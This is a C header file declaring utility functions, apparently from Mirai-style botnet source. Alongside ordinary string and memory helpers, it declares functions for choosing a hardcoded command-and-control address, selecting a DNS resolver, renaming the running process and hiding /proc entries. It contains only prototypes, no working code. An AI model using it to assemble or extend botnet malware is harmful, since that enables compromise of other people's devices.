#pragma once

#include "includes.h"

#define CONVERT_ADDR(x) x & 0xff, (x >> 8) & 0xff, (x >> 16) & 0xff, (x >> 24) & 0xff
#define LEN(x) (sizeof(x) / sizeof(*x))

int util_strlen(char *);
int util_atoi(char *, int);

int util_strcpy(char *, char *);
int util_memsearch(char *, int, char *, int);
int util_stristr(char *, int, char *);
int util_split(const char *, char, char ***);
int utill_strcmp(const char *, const char *);
int util_strncmp1(char *, char *, size_t);

char *util_strcat(char *, const char *);
char *util_fdgets(char *, int, int);
char *util_itoa(int, int, char *);

BOOL util_mem_exists(char *, int, char *, int);
BOOL util_strncmp(char *, char *, int);
BOOL util_strcmp(char *, char *);

char *util_strstr(const char *, const char *);
char *util_strchr(const char *, int);

void util_memcpy(void *, void *, int);
void util_zero(void *, int);
void *util_memset(void *, int, size_t);
void _memset(void *, char, int);

int util_isupper(char);
int util_isalpha(char);
int util_isspace(char);
int util_isdigit(char);

char* _self_path();

ipv4_t util_local_addr(void);

int util_memcmp(const void *s1, const void *s2, size_t n);
int _random_cnc_addr_hardcode();
const char* _select_dot_resolver();

int _atoi(char *);
int _isdigit(char);

const char* _random_proc_rename();
int _rename_executable(int argc, char **args);
//static void unmount_proc_entries(void);
